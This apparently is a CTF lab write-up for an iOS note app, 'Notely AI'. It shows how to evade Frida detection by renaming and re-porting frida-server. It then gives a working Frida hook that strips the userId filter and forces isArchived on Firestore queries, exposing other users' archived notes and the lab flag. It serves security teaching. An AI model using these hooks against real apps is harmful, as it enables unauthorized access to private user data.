**Description**: Notely AI is a note keeper app for iOS which can create AI summaries of notes and  implements multiple security layers. However, these security measures may not be as robust as they appear. Can you bypass the security mechanisms and access the hidden flag in the archived notes section?

**Link**: https://www.mobilehackinglab.com/course/lab-notelyai-mhc

![[mhl-notelyAI1.png]]

Install an **IPA** file can be difficult. So, for make it more easy, I made a YouTube video with the process using **Sideloadly**. **LINK**: [https://www.youtube.com/watch?v=YPpo9owRKGE](https://www.youtube.com/watch?v=YPpo9owRKGE)

Once you have the app installed, let's proceed with the challenge. **unzip** the **`.ipa`** file.
### Recon
When we run the application we can see that **we have a Frida security check**:

![[mhl-notelyAI2.png]]

I wonder... **How can it detect if we have Frida, if we didn't spawn the app?**
The application have a measure that **checks if the `frida-server` binary is running on our iOS device**.
Maybe *the app also do the necessary checks on the port Frida usually uses* (`27042`)

Let's connect via **ssh** to our device!
And then, let's check for `frida-server` running:
```bash
iPhoneHack:~ root# ps -e | grep frida-server
```
Output:
```bash
354 ??         1:13.63 /var/jb/usr/sbin/frida-server
```

We got the location and the **PID**.
Let's *rename the binary*:
```bash
mv /var/jb/usr/sbin/frida-server /var/jb/usr/sbin/system-daemon
```
Also kill the `frida-server`:
```bash
kill -9 354
```
Finally, run the **renamed** `frida-server` but now with port `44444`:
```bash
/var/jb/usr/sbin/system-daemon -l 0.0.0.0:44444 &
```

Let's try **spawn** the application, but before we need get the **Identifier**
```bash
frida-ps -Uai | grep Notely
```
Now, if we **spawn** the app:
```bash
frida -H 192.168.0.248:44444 -f com.mobilehackinglab.notelyai.YX4C7J2RLK
```
**`-H 192.168.0.248:44444`** for communicate with our device and *configured port*.

We can notice that successful the **Frida security check** was **bypassed**!

![[mhl-notelyAI3.png]]
### Static Code Analysis
Pay attention in the **Profile** tab, we can see a **role** based access level.
Also, **Firebase** are incorporated.

Inside of `Payload/notelyai.app` directory you will find the **binary** file:
```bash
file notelyai
notelyai: Mach-O 64-bit executable arm64
```

Let's **import this binary in Ghidra**!
After some **strings search** and some *references*, I found interesting **classes** and **functions**, really a little obfuscated in the whole code... But with patience (a lot) you can do amazing things.

- **`void FUN_100037de0(void)`**
```C
{
  char cVar1;
  undefined *puVar2;
  int iVar3;
  undefined *puVar4;
  undefined *puVar5;
  class_t *pcVar6;
  int extraout_x8;
  int extraout_x8_00;
  int unaff_x20;
  int iVar7;
  int iVar8;
  int iVar9;
  code *pcVar10;
  undefined auStack_70 [8];
  undefined *local_68;
  
  puVar4 = &DAT_1009b56e0;
  FUN_1000053f0();
  iVar8 = *(int *)(puVar4 + -8);
  (*(code *)PTR____chkstk_darwin_100934e40)(*(undefined8 *)(iVar8 + 0x40));
  puVar5 = &DAT_1009b69a8;
  FUN_1000053f0();
  iVar9 = *(int *)(puVar5 + -8);
  (*(code *)PTR____chkstk_darwin_100934e40)(*(undefined8 *)(iVar9 + 0x40));
  iVar3 = _TtC8notelyai12NotesService::_notes;
  puVar2 = PTR___swiftEmptyArrayStorage_1009369c0;
  iVar7 = (int)(auStack_70 + -(extraout_x8 + 0xfU & 0xfffffffffffffff0)) -
          (extraout_x8_00 + 0xfU & 0xfffffffffffffff0);
  local_68 = PTR___swiftEmptyArrayStorage_1009369c0;
  FUN_1000053f0(&DAT_1009b6428);
  cVar1 = (char)&stack0xfffffffffffffff0;
  Combine::Published::init(cVar1 + -0x58);
  pcVar10 = *(code **)(iVar9 + 0x20);
  (*pcVar10)(unaff_x20 + iVar3,iVar7,puVar5);
  iVar3 = _TtC8notelyai12NotesService::_archivedNotes;
  local_68 = puVar2;
  Combine::Published::init(cVar1 + -0x58);
  (*pcVar10)(unaff_x20 + iVar3,iVar7,puVar5);
  iVar3 = _TtC8notelyai12NotesService::_isLoading;
  local_68 = (undefined *)((uint)local_68 & 0xffffffffffffff00);
  Combine::Published::init(cVar1 + -0x58);
  (**(code **)(iVar8 + 0x20))
            (unaff_x20 + iVar3,auStack_70 + -(extraout_x8 + 0xfU & 0xfffffffffffffff0),puVar4);
  iVar3 = _TtC8notelyai12NotesService::db;
  pcVar6 = &objc::class_t::FIRFirestore;
  _objc_opt_self();
  _objc_msgSend();
  _objc_retainAutoreleasedReturnValue();
  *(class_t **)(unaff_x20 + iVar3) = pcVar6;
  FUN_100037f74();
  return;
}
```

The **init** of *`notelyai.NotesService`*
This function initializes `@Published _notes, _archivedNotes, _isLoading`.
- `db = FIRFirestore.firestore()` (ObjC message to **`FIRFirestore`** and `retainee` from `return`).

Looking the *end of the previous* code, we can see:
- **`void FUN_100037f74(undefined8 param_1,Published *param_2)`**
```C
{
  uint *puVar1;
  uint *puVar2;
  NSString *pNVar3;
  NSString *pNVar4;
  undefined8 uVar5;
  NSNumber *pNVar6;
  undefined *puVar7;
  void *aBlock;
  int unaff_x20;
  undefined8 uVar8;
  undefined *local_70;
  undefined8 local_68;
  code *local_60;
  undefined *puStack_58;
  code *local_50;
  undefined *local_48;
  
  puVar1 = (uint *)0x0;
  FUN_100129088();
  FUN_10010f79c();
  puVar7 = PTR__swift_isaMask_100936bc8;
  puVar2 = puVar1;
  (**(code **)((*(uint *)PTR__swift_isaMask_100936bc8 & *puVar1) + 0x158))();
  _objc_release(puVar1);
  if (puVar2 != (uint *)0x0) {
    (**(code **)((*(uint *)puVar7 & *puVar2) + 0x350))();
    _objc_release(puVar2);
    _swift_getKeyPath(&DAT_100776860);
    _swift_getKeyPath(&DAT_100776888);
    local_70 = (undefined *)CONCAT71(local_70._1_7_,1);
    _swift_retain();
    Combine::Published::$set_subscript(param_2,(char)&local_70);
    uVar8 = *(undefined8 *)(unaff_x20 + _TtC8notelyai12NotesService::db);
    pNVar3 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
    _objc_msgSend(uVar8,"collectionWithPath:",pNVar3);
    _objc_retainAutoreleasedReturnValue();
    _objc_release(pNVar3);
    pNVar3 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
    pNVar4 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
    _swift_bridgeObjectRelease(param_2);
    uVar5 = uVar8;
    _objc_msgSend(uVar8,"queryWhereField:isEqualTo:",pNVar3,pNVar4);
    _objc_retainAutoreleasedReturnValue();
    _objc_release(uVar8);
    _objc_release(pNVar3);
    _objc_release(pNVar4);
    pNVar3 = (extension_Foundation)::Swift::String::_bridgeToObjectiveC();
    pNVar6 = (extension_Foundation)::bool::_bridgeToObjectiveC();
    uVar8 = uVar5;
    _objc_msgSend(uVar5,"queryWhereField:isEqualTo:",pNVar3,pNVar6);
    _objc_retainAutoreleasedReturnValue();
    _objc_release(uVar5);
    _objc_release(pNVar3);
    _objc_release(pNVar6);
    puVar7 = &DAT_1009391e8;
    _swift_allocObject(&DAT_1009391e8,0x18,7);
    _swift_weakInit(puVar7 + 0x10);
    local_50 = FUN_10003a858;
    local_70 = PTR___NSConcreteStackBlock_100934e28;
    local_68 = 0x42000000;
    local_60 = FUN_100038758;
    puStack_58 = &DAT_1009392a0;
    local_48 = puVar7;
    aBlock = __Block_copy(&local_70);
    _swift_release(local_48);
    uVar5 = uVar8;
    _objc_msgSend(uVar8,"addSnapshotListener:",aBlock);
    _objc_retainAutoreleasedReturnValue();
    __Block_release(aBlock);
    _swift_unknownObjectRelease(uVar5);
    _objc_release(uVar8);
  }
  return;
}
```

This is the **construction** of the **query and listener**.
- `collectionWithPath:` → "**notes**".
1. **First `where`** with *two strings* (*bridge*): **`"userId" == <uid>`**.
2. **Second `where`** with *bool*: **`"isArchived" == <true|false>`**.
`addSnapshotListener:` with a Block that **updates** the `@Published`.
### Getting the Notes
This attack may LOOK LIKE SQLi (*omitting the part that we are working with Firestore, a NoSQL DB*).

In a classic SQLi attack, **the attacker injects SQL code directly into relational database queries** (MySQL, PostgreSQL, etc.). This occurs *when the backend server fails to properly parameterize input*, allowing malicious code to be executed.

In this case:
- It is queried **from the client (app)** using a public API (`whereField:isEqualTo:`).
- It **expects the client itself to apply access filters** (`userId`, `isArchived`, etc.).

The **problem is that security depends exclusively on these client-side conditions**, and the server doesn't validate anything using rules (`firestore.rules`). This allows **Frida to manipulate client behavior at runtime**, leading to unauthorized access to data.

Let's create the Frida script
```javascript
const Q = ObjC.classes.FIRQuery;
const imp = Q['- queryWhereField:isEqualTo:'].implementation;
const orig = new NativeFunction(imp, 'pointer',
  ['pointer','pointer','pointer','pointer']);

Interceptor.replace(imp, new NativeCallback(function(self,_cmd,field,val){
  const key = new ObjC.Object(field).toString().toLowerCase();
  if (key === 'isarchived') {
    const v = ObjC.classes.NSNumber.numberWithBool_(1);
    console.log("isArchived hijack");
    return orig(self,_cmd,field, v);                 // archived is TRUE
  }
  if (key === 'userid' || key === 'ownerid' || key === 'uid') {
    console.log("userId hijack");
    return self;                                     // delete userId filter
  }
  return orig(self,_cmd,field,val);
}, 'pointer', ['pointer','pointer','pointer','pointer']));
```

Now we can finally run the Frida command:
```bash
frida -H 192.168.0.248:44444 -f com.mobilehackinglab.notelyai.YX4C7J2RLK -l hijackNotes.js
```

And we can now see the **Flag** note!

![[mhl-notelyAI4.png]]

*What we learn?*
Sometimes, the **confidentiality of archived notes depends exclusively on client-side** (`Firestore`) **filters based** on `userId` and `isArchived`.
An attacker with instrumentation capabilities can:
- Remove the `userId` filter.
- Force `isArchived=true`.
- View **all archived** notes (including administrators).
*Fully applicable to thousands of real-world applications*

**Flag**: **`MHC{4rch1v3d_n0t3s_4r3_n0t_s3cur3!}`**

I hope you found it useful (: